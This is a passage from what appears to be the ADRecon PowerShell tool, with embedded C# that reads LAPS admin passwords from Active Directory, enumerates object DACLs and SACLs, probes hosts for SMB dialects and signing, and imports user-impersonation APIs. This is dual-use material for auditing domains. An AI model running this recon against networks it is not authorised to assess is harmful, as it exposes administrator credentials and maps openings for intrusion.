                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    String Name = null;
                    String Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            String IdentityReference = Convert.ToString(Rule.IdentityReference);
                            String Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    String Name = null;
                    String Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            String IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
    }
}
"@

#Add-Type -TypeDefinition $Source -ReferencedAssemblies ([System.String[]]@(([system.reflection.assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location,([system.reflection.assembly]::LoadWithPartialName("System.DirectoryServices")).Location))

# modified version from https://github.com/vletoux/SmbScanner/blob/master/smbscanner.ps1
$PingCastleSMBScannerSource = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;
using System.Management.Automation;

namespace ADRecon
{
    public class PingCastleScannersSMBScanner
	{
        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(string computer)
		{
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@

# Import the LogonUser, ImpersonateLoggedOnUser and RevertToSelf Functions from advapi32.dll and the CloseHandle Function from kernel32.dll
# https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Add-Type?view=powershell-5.1
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379317(v=vs.85).aspx

$Advapi32Def = @'
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
'@

# https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx

$Kernel32Def = @'
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
'@

Function Get-DateDiff
{
<#
.SYNOPSIS
    Get difference between two dates.

.DESCRIPTION
    Returns the difference between two dates.

.PARAMETER Date1
    [DateTime]
    Date

.PARAMETER Date2
    [DateTime]
    Date

.OUTPUTS
    [System.ValueType.TimeSpan]
    Returns the difference between the two dates.
#>
    param (
        [Parameter(Mandatory = $true)]
        [DateTime] $Date1,

        [Parameter(Mandatory = $true)]
        [DateTime] $Date2
    )

    If ($Date2 -gt $Date1)
    {
        $DDiff = $Date2 - $Date1
    }
    Else
    {
        $DDiff = $Date1 - $Date2
    }
    Return $DDiff
}

Function Get-DNtoFQDN
{
<#
.SYNOPSIS
    Gets Domain Distinguished Name (DN) from the Fully Qualified Domain Name (FQDN).

.DESCRIPTION
    Converts Domain Distinguished Name (DN) to Fully Qualified Domain Name (FQDN).

.PARAMETER ADObjectDN
    [string]
    Domain Distinguished Name (DN)

.OUTPUTS
    [String]
    Returns the Fully Qualified Domain Name (FQDN).

.LINK
    https://adsecurity.org/?p=440
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ADObjectDN
    )

    $Index = $ADObjectDN.IndexOf('DC=')
    If ($Index)
    {
        $ADObjectDNDomainName = $($ADObjectDN.SubString($Index)) -replace 'DC=','' -replace ',','.'
    }
    Else
    {
        # Modified version from https://adsecurity.org/?p=440
        [array] $ADObjectDNArray = $ADObjectDN -Split ("DC=")
        $ADObjectDNArray | ForEach-Object {
            [array] $temp = $_ -Split (",")
            [string] $ADObjectDNArrayItemDomainName += $temp[0] + "."
        }
        $ADObjectDNDomainName = $ADObjectDNArrayItemDomainName.Substring(1, $ADObjectDNArrayItemDomainName.Length - 2)
    }
    Return $ADObjectDNDomainName
}

Function Export-ADRCSV
{
<#
.SYNOPSIS
    Exports Object to a CSV file.

.DESCRIPTION
    Exports Object to a CSV file using Export-CSV.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the CSV File.

.OUTPUTS
    CSV file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        $ADRObj | Export-Csv -Path $ADFileName -NoTypeInformation
    }
    Catch
    {
        Write-Warning "[Export-ADRCSV] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADRXML
{
<#
.SYNOPSIS
    Exports Object to a XML file.

.DESCRIPTION
    Exports Object to a XML file using Export-Clixml.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the XML File.

.OUTPUTS
    XML file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject $ADRObj).Save($ADFileName)
    }
    Catch
    {
        Write-Warning "[Export-ADRXML] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADRJSON
{
<#
.SYNOPSIS
    Exports Object to a JSON file.

.DESCRIPTION
    Exports Object to a JSON file using ConvertTo-Json.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the JSON File.

.OUTPUTS
    JSON file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject $ADRObj | Out-File -FilePath $ADFileName
    }
    Catch
    {
        Write-Warning "[Export-ADRJSON] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADRHTML
{
<#
.SYNOPSIS
    Exports Object to a HTML file.

.DESCRIPTION
    Exports Object to a HTML file using ConvertTo-Html.

.PARAMETER ADRObj
    [PSObject]
    ADRObj

.PARAMETER ADFileName
    [String]
    Path to save the HTML File.

.OUTPUTS
    HTML file.
#>
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName,

        [Parameter(Mandatory = $false)]
        [String] $ADROutputDir = $null
    )

$Header = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If ($ADFileName.Contains("Index"))
        {
            $HTMLPath  = -join($ADROutputDir,'\','HTML-Files')
            $HTMLPath = $((Convert-Path $HTMLPath).TrimEnd("\"))
